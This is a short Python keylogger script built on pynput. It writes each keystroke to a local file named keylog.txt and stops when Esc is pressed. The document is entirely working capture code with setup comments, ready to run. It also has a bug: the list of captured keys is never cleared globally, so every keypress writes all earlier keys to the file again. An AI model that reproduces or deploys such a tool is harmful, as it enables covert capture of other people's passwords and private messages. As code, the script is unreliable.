#to run the program, install required packages
# pip install pynput
# to stop the program, press the 'Esc' button

from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

keys = []

def on_press(key):
    global keys
    keys.append(key)
    write_file(keys)

def write_file(keys):
    with open(log_file, "a") as f:
        for key in keys:
            # Format the key for readability
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
        keys = []

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
